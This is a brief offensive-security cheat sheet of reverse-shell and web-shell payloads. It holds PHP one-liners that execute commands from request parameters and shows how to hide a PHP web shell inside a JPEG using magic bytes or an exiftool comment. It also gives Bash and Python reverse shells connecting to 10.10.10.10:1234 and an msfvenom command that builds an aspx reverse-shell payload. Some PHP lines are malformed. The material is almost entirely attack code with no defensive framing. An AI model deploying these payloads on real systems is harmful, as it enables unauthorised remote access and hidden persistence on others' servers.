# Reverse Shells

#### PHP Reverse Shells

##### Basic PHP reverse shells

```php
<php echo exec('whoami');?>
<php system("whoami"); ?>
<php system($_REQUEST['wr3nch']); #	works with the post verb
<php system($_GET['wr3nch']); >
```


##### PHP reverse shell in images

```bash
# Using magic bytes
echo 'FFD8FFDB' | xxd -r -p > webshell.php.jpg
echo '<?=`$_GET[wr3nch]`?>' >> webshell.php.jpg
# Using exiftool
exiftool -comment='<?php system($_GET['wr3nch']);?>' \<file_name\>.\<extension\>
```

##### Bash
```bash
bash -c "bash -i >& /dev/tcp/10.10.10.10/1234 0>&1"
```

##### Python
```py
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### MSFVENOM

##### aspx reverse shell
```bash
# generate an aspx for windows machine
msfvenom -p windows/shell_reverse_tcp LHOST=xxxxxx LPORT=xxxxx -f aspx > exploit.aspx
```
